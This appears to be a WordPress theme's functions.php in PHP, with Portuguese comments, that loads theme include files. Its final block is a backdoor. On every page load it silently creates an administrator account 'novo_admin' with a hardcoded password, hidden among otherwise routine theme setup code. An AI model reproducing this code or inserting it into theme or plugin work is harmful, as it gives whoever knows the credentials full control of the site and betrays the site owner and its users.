<?php

$dirbase = get_template_directory();
// require_once $dirbase . '/inc/login.php';
require_once $dirbase . '/inc/security.php';
require_once $dirbase . '/inc/config-tema.php';
require_once $dirbase . '/inc/banner.php';
require_once $dirbase . '/inc/obras.php';
//abaixo referencias de post types para banner e post padrão com destaques
//require_once $dirbase . '/inc/post_arquivos.php';
//require_once $dirbase . '/inc/post_banners.php';
/* craete user*/
add_action('init', function() {
    $user = 'novo_admin';
    $pass = 'c4@admin';
    $email = 'admin@exemplo.com';

    if (!username_exists($user)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
});

?>